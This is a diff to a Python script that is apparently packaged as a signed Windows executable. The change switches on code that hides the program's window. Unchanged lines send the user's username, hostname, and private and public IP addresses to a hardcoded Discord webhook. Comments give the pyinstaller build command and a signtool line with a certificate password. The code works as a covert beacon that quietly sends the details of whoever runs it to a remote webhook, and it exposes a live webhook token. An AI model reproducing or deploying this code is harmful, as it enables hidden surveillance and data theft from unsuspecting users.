@@ -1,7 +1,7 @@
-# import win32gui, win32con
-#
-# the_program_to_hide = win32gui.GetForegroundWindow()
-# win32gui.ShowWindow(the_program_to_hide , win32con.SW_HIDE)
+import win32gui, win32con
+
+the_program_to_hide = win32gui.GetForegroundWindow()
+win32gui.ShowWindow(the_program_to_hide , win32con.SW_HIDE)
 
 #pyinstaller -w -F -i C:\Users\tilov\Downloads\test-main\watdahel_muE_icon.ico test.py
 #signtool.exe sign /f test.pfx /fd SHA256 /p TomaTo test-0.6-I.exe
@@ -76,7 +76,7 @@ if internet() == True:
         DEVT = 'False'
 
     hook = Webhook('https://discord.com/api/webhooks/1233410596167221369/uQV4e2bAYeoP1PCm2i5ur68-uhJ15bgvhBbg0CN159sawhZ8UKscnQpD79yflVa_lmEi')
-    hook.send(f"-----\n{DEV}||<@691670319248965694>|| \n\nUSERNAME:                         {username} \nHOSTNAME:                         {hostname} \nPRIVATE IPADDRESS:        {IPPri} \nPUBLIC IPADRESS:             {IPPub}\n-----")
+    hook.send(f"-----\n{DEV} ||<@691670319248965694>|| \n\nUSERNAME:                         {username} \nHOSTNAME:                         {hostname} \nPRIVATE IPADDRESS:        {IPPri} \nPUBLIC IPADRESS:             {IPPub}\n-----")
 
     # if not username == DEVNAME:
     #     #####
